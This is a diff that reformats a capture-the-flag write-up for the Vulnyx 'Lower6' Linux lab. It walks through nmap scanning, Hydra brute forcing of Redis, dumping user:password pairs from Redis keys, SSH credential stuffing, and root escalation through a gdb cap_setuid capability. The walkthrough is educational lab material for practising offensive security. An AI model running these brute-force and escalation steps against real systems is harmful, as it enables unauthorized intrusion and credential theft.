@@ -1,24 +1,32 @@
-# 🖥️ Writeup - Lower6 
+---
+icon: linux
+---
 
-**Platform:** Vulnyx  
-**Operating System:** Linux  
+# Lower6 ​
+
+## 🖥️ Writeup - Lower6
+
+**Platform:** Vulnyx\
+**Operating System:** Linux
 
 > **Tags:** `Linux` `Redis` `Hydra` `Credential Dumping` `Credential Stuffing` `Capabilities` `Python`
 
-# INSTALLATION
+## INSTALLATION
 
 We download the `zip` containing the `.ova` of the Lower6 machine, extract it, and import it into VirtualBox.
 
 We configure the network interface of the Lower6 machine and run it alongside the attacker machine.
 
-# HOST DISCOVERY
+## HOST DISCOVERY
 
 At this point, we still don’t know which `IP` address is assigned to Lower6, so we discover it as follows:
 
 ```bash
 netdiscover -i eth1 -r 10.0.0.0/16
 ```
+
 Info:
+
 ```
 Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                                
@@ -30,22 +38,24 @@ Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts
  10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
  10.0.4.3        08:00:27:14:65:c8      1      60  PCS Systemtechnik GmbH      
  10.0.4.30       08:00:27:25:75:41      1      60  PCS Systemtechnik GmbH
- ```
+```
 
 We identify with high confidence that the victim’s IP is `10.0.4.30`.
 
-# PORT SCANNING
+## PORT SCANNING
 
 Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.30
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,6379 --min-rate 5000 10.0.4.30
 ```
+
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 15:26 CET
 Nmap scan report for 10.0.4.30
@@ -66,7 +76,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.56 seconds
 
 We identify open ports `22` (SSH) and `6379` (Redis).
 
-# REDIS
+## REDIS
 
 We check if `Redis` allows anonymous authentication, but we discover that unauthenticated access is not permitted.
 
@@ -75,6 +85,7 @@ redis-cli -h 10.0.4.30 INFO
 ```
 
 Info:
+
 ```
 NOAUTH Authentication required.
 ```
@@ -86,6 +97,7 @@ hydra -P /usr/share/wordlists/rockyou.txt redis://10.0.4.30 -t 64
 ```
 
 Info:
+
 ```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -106,6 +118,7 @@ redis-cli -h 10.0.4.30 -a hellow KEYS '*'
 ```
 
 Info:
+
 ```
 Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
 1) "key2"
@@ -122,6 +135,7 @@ redis-cli -h 10.0.4.30 -a hellow MGET key1 key2 key3 key4 key5
 ```
 
 Info:
+
 ```
 Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
 1) "killer:K!ll3R123"
@@ -131,8 +145,7 @@ Warning: Using a password with '-a' or '-u' option on the command line interface
 5) "shadow:ShadowMaze@9"
 ```
 
-We notice that the `key` values follow a `user:password` format.
-We save the 5 usernames and the 5 passwords into separate wordlists.
+We notice that the `key` values follow a `user:password` format. We save the 5 usernames and the 5 passwords into separate wordlists.
 
 ```bash
 nano users.txt
@@ -145,7 +158,8 @@ snake
 wolf
 shadow
 ```
------------------------------------------------------------------------------------------------------------------------------------
+
+***
 
 ```bash
 nano pass.txt
@@ -166,6 +180,7 @@ hydra -L users.txt -P pass.txt ssh://10.0.4.30 -t 64
 ```
 
 Info:
+
 ```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -184,7 +199,7 @@ We log in via `SSH`.
 ssh killer@10.0.4.30
 ```
 
-# PRIVILEGE ESCALATION
+## PRIVILEGE ESCALATION
 
 We check for `sudo` privileges, `SUID` binaries, and Linux `capabilities`.
 
@@ -193,6 +208,7 @@ We check for `sudo` privileges, `SUID` binaries, and Linux `capabilities`.
 ```
 
 Info:
+
 ```
 /usr/bin/ping cap_net_raw=ep
 /usr/bin/gdb cap_setuid=ep
@@ -207,6 +223,7 @@ We consult `GTFOBins` to find the command needed to exploit this misconfiguratio
 ```
 
 Info:
+
 ```
 # whoami
 root
